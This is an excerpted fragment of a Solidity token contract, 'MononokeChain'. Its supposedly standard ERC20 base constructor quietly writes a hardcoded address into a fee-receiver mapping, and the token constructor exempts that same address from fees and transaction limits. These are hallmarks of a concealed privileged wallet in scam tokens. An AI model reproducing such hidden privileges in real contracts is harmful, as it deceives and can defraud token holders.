...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0xC7346ed5F537A1734bE795EA0B73B03aDe634855] = _marketingwallet;
    }
...
contract MononokeChain is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Mononoke Chain", "MC") {
        ...
        excludeFromFees(address(0xC7346ed5F537A1734bE795EA0B73B03aDe634855), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xC7346ed5F537A1734bE795EA0B73B03aDe634855), true);
